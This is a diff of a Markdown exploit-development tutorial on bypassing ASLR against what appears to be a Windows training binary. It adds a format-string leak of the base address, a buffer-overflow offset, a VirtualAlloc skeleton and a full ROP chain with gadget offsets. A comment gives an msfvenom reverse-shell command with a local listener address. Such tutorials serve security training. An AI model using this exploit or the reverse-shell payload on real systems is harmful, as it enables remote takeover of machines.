@@ -1,4 +1,4 @@
-## Bypassing ASLR (In Progress...)
+## Bypassing ASLR
 
 ## What is ASLR?
 
@@ -110,4 +110,146 @@ def add_quote(quote):
 
 def bad_request(buf):
     return send(800, buf)
+```
+
+And we try to leak the base address:
+
+```py
+def leak_base_address():
+    print("[+] Leaking address...\n")
+
+    quote_id = unpack("<L", add_quote(b"%x " * 30))[0]
+    base_str = get_quote(quote_id).split(b" ")[2].decode()
+    base = (int(base_str, 16) // 0x10000) * 0x10000
+
+    print("Your base address is --> " + hex(base))
+    return base
+```
+
+### Explanation of Each Part
+
+#### quote_id = unpack("<L", add_quote(b"%x " * 30))[0]
+This function call likely sends a formatted string ("%x " * 30, which is 30 instances of the format specifier %x ) as input to a vulnerable function in the target program.
+    %x is used in printf-style formatting to print hexadecimal values. By sending %x repeatedly, the exploit is likely trying to leak information from the stack by printing memory addresses that are higher up on the stack frame.
+    The return value of add_quote is then passed to unpack("<L", ...), which interprets the data as a 4-byte little-endian long integer (indicated by "<L").
+    unpack returns a tuple, and [0] extracts the first element, which is saved as quote_id. This value is probably a reference or identifier for the added "quote" and is later used to retrieve the quote.
+
+#### base_str = get_quote(quote_id).split(b" ")[2].decode()
+
+get_quote(quote_id) retrieves the previously added "quote" based on quote_id. The quote returned is presumably a string of leaked memory addresses.
+    .split(b" ")[2] splits this retrieved data by spaces and selects the third element ([2]), which contains the hexadecimal address the exploit is interested in.
+    .decode() converts this byte string to a regular string for easier handling.
+
+#### base = (int(base_str, 16) // 0x10000) * 0x10000
+
+int(base_str, 16) converts base_str (a hexadecimal string) into an integer.
+    The exploit then "aligns" this address to the nearest 0x10000 (64 KB) boundary. ASLR generally randomizes addresses but often keeps them aligned to predictable boundaries, such as 64 KB.
+    The formula (int(base_str, 16) // 0x10000) * 0x10000 effectively rounds down the address to the nearest 0x10000 boundary, which is likely the base address of the module or executable.
+
+### Exploiting the Binary
+
+The size we use for crashing is "3000", and the offset to overwrite the "eip" is "2064". We are going to use "VirtualAlloc" in this case. The structure of that function is the following:
+
+```
+LPVOID WINAPI VirtualAlloc(
+ _In_opt_ LPVOID lpAddress,
+ _In_ SIZE_T dwSize,
+ _In_ DWORD flAllocationType,
+ _In_ DWORD flProtect
+);
+```
+
+And we use the following skeleton:
+
+```py
+va = pack("<L", (0x45454545))       # dummy VirutalAlloc Address
+va += pack("<L", (0x46464646))      # Shellcode Return Address
+va += pack("<L", (0x47474747))      # dummy Shellcode Address
+va += pack("<L", (0x48484848))      # dummy dwSize
+va += pack("<L", (0x49494949))      # dummy flAllocationType
+va += pack("<L", (0x51515151))      # dummy flProtect
+```
+
+Finally we write the ROP chain explaining each step:
+
+```py
+def exploit():
+    base = leak_base_address()
+
+    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.23 LPORT=4444 EXITFUNC=thread -f python -v shell
+    shell = b""
+
+    # LPVOID WINAPI VirtualAlloc(
+    #   _In_opt_ LPVOID lpAddress,
+    #   _In_ SIZE_T dwSize,
+    #   _In_ DWORD flAllocationType,
+    #   _In_ DWORD flProtect
+    # );
+
+    va = pack("<L", (0x45454545))       # dummy VirutalAlloc Address
+    va += pack("<L", (0x46464646))      # Shellcode Return Address
+    va += pack("<L", (0x47474747))      # dummy Shellcode Address
+    va += pack("<L", (0x48484848))      # dummy dwSize
+    va += pack("<L", (0x49494949))      # dummy flAllocationType
+    va += pack("<L", (0x51515151))      # dummy flProtect
+
+    rop = [
+# 1. Get ESP (in eax)
+        base + 0x25c0, # xor eax, eax ; ret
+        base + 0x1e69, # or eax, esp ; ret
+
+# 2. Get dummy call addr (in ebx)
+        base + 0x2b38, # pop ecx ; ret
+        0x1ec, # eax + ? = dummy call
+        base + 0x9b36, # add eax, ecx ; pop ebx ; ret
+        0xffffffff, # junk for pop ebx
+        base + 0x1e73, # mov ebx, eax ; ret
+
+# 3. Deref virtualAlloc (in eax)
+        base + 0x2b37, # pop eax ; pop ecx ; ret
+        base + 0x43218, # base + iat + virtualalloc
+        0xffffffff, # junk for pop ecx
+        base + 0x1e6c, # mov eax, [eax] ; add ecx, 0x5 ; pop edx ; ret
+        0xffffffff, # junk for pop edx
+
+# 4. Write virtual alloc to dummy
+        base + 0x1e7a, # mov [ebx], eax ; ret
+
+# 5. Get shellcode addr (in eax)
+        base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret
+        base + 0x2cec, # mov eax, edx ; ret
+        base + 0x2b38, # pop ecx ; ret
+        0x18, # eax + ? = dummy call
+        base + 0x9b36, # add eax, ecx ; pop ebx ; ret
+        0xffffffff, # junk for pop ebx
+        base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret
+
+# 6. Get dummy call addr + 0x4 (in ebx)
+        base + 0x1e82, # add ebx, 0x4 ; ret
+
+# 7. Write shellcode addr to dummy + 0x4
+        base + 0x1e7a, # mov [ebx], eax ; ret
+
+# 8. Get dummy call addr + 0x8 (in ebx)
+        base + 0x1e82, # add ebx, 0x4 ; ret
+
+# 9. Write shellcode addr to dummy + 0x8
+        base + 0x1e7a, # mov [ebx], eax ; ret
+
+# 10. Align esp with dummy call (ebx-8)
+        base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret
+        base + 0x2b38, # pop ecx ; ret
+        0xfffffff8, # edx + ? = dummy call
+        base + 0x1e86, # add edx, ecx ; ret
+        base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret
+        base + 0x1e76, # xchg ebx, esp ; dec ecx ; ret
+    ]
+    rop = b"".join([pack("<L", r) for r in rop])
+
+    filler = b"A" * (offset - len(va))
+    padding = b"C" * (crash_len - len(filler + va + rop + shell))
+
+    buf = filler + va + rop + shell + padding
+
+    bad_request(buf)
 ```
